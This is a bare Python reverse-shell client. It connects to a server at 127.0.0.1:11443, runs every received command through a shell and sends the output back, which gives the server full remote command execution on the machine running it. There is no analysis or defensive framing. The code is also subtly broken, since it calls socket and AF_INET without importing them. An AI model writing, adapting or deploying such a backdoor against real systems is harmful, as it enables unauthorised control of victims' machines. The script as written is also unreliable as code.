import socket, subprocess

HOST = '127.0.0.1'
PORT = 11443

sSock = socket( AF_INET, SOCK_STREAM )
sSock.connect( ( HOST, PORT ) )
sSock.send( '[*] Connection Established!' )

while 1:
    sData = sSock.recv( 1024 )
    if sData == ".quit":
        print( "quit message received from server")
        break

    sProc = subprocess.Popen( sData, 
                              shell = True, 
                              stdout = subprocess.PIPE,
                              stderr = subprocess.PIPE,
                              stdin = subprocess.PIPE )
    sStdout_Value = sProc.stdout.read() + sProc.stderr.read()
    sSock.send( sStdout_Value )

sSock.close()
